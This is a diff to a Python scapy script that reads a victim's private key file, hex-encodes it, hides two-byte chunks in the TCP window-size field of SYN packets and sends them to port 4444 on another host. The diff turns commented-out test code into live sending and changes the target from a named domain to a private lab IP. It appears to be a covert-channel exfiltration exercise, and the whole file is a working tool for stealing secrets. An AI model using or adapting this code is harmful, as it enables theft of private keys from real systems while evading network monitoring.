@@ -1,38 +1,34 @@
 #!/usr/bin/env python3
 from scapy.all import *
 from common import *
+from time import sleep
 
 
 if __name__ == "__main__":
+    print("Radining in victim private key...")
     with open("victim.key.pem", "r") as f:
         victim_key = f.read()
 
+    print("Serializing data into hex...")
     # Serialize into hex
     hex_string = ser_data(victim_key)
 
+    print("Chunking data into two-byte chunks...")
     # Chunk it into two-byte chunks
     # TCP receive window size field is two bytes in length
     chunks = chunk(hex_string)
 
+    print("Encoding chunks into TCP headers...")
     # Create custom SYN packets
     packets = []
     for chunk in chunks:
         window_size = int(chunk, 16)
-        p = IP(dst="viper.jcc.sh") / TCP(dport=4444, window=window_size)
+        p = IP(dst="192.168.142.129") / TCP(dport=4444, window=window_size)
         packets.append(p)
 
-    # for p in packets:
-    # send(p)
-    # for p in packets:
-    # print(p.window, str(format(p.window, "04x")))
+    print(f"Encoded chunks into {len(packets)} packets! Sending...")
+    for p in packets:
+        print("!", end="")
+        send(p, verbose=False)
 
-    reconstructed_hex_string = reconstruct_hex_string(packets)
-
-    # # print(reconstructed_hex_string)
-    assert hex_string == reconstructed_hex_string
-    reconstructed_victim_key = deser_data(reconstructed_hex_string)
-    with open("original_hex_string.txt", "w") as f:
-        f.write(hex_string)
-
-    # print(reconstructed_victim_key)
     print()
